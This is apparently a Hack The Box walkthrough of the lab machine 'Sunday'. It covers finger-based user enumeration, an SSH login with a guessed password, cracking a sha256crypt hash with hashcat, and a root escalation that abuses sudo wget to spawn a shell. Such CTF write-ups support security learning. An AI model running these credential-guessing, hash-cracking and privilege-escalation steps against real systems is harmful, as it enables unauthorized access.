<img src="Pasted image 20240720111158.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240628182437.png]]

Nmap Scans
```
mapit 10.10.10.76
```

Nmap Default Scan
![[Pasted image 20240628182623.png]]

Nmap Service and Script Scan
![[Pasted image 20240628183044.png]]

Nmap All Port Scan
![[Pasted image 20240628183754.png]]

Script and Service scan for Newly found ports
![[Pasted image 20240628183826.png]]

On Port 6787 https://10.10.10.76:6787
![[Pasted image 20240628184452.png]]

Will Enumerate Port 79 Fingers, Check the site for more info https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
```
finger @10.10.10.76
finger admin@10.10.10.76
Finger root@10.10.10.76
```
![[Pasted image 20240628183858.png]]



Get the Perl Script from this link https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl to enumerate finger

User Enumeration 
```
perl finger.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```



Will try ssh to sunny 
```
ssh sunny@10.10.10.76 -p 22022
```
![[Pasted image 20240628192158.png]]
We have to try default Passwords like and box name as a password, admin, root, username as password.

In this case box name is the password **sunny:sunday**

Will first read history file 
![[Pasted image 20240628192548.png]]
![[Pasted image 20240628192606.png]]
![[Pasted image 20240628192617.png]]

Will check the backup file
![[Pasted image 20240628194257.png]]

We Try to decrypt this password of Sammy
![[Pasted image 20240628194330.png]]
Found Hash type it is sha256crypt

Will decrypt this using Hashcat
```
hashcat --help | grep -i "sha256crypt"
```
![[Pasted image 20240628194413.png]]
Found the mode, it is 7400

Will crack it now, I have saved the hash of sammy in file named hash
```
hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt --force
```
![[Pasted image 20240628194549.png]]
Found it...! **sammy:cooldude**!

Will change our shell to sammy now
```
su sammy
```
![[Pasted image 20240628194713.png]]

Will jump to Privilege Escalation....!

Will check our sudo privileges 
```
sudo -l
```
![[Pasted image 20240628194743.png]]

We can execute wget with sudo, will check is there any way to escalate or privileges with in GTFObins https://gtfobins.github.io/gtfobins/wget/#sudo
![[Pasted image 20240628194852.png]]

Will run this
```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```
![[Pasted image 20240628194947.png]]
We A3r r0o!.....:)


Will get flags Now
User.txt
![[Pasted image 20240628195040.png]]

root.txt
![[Pasted image 20240628195107.png]]



Done With Sunday......:)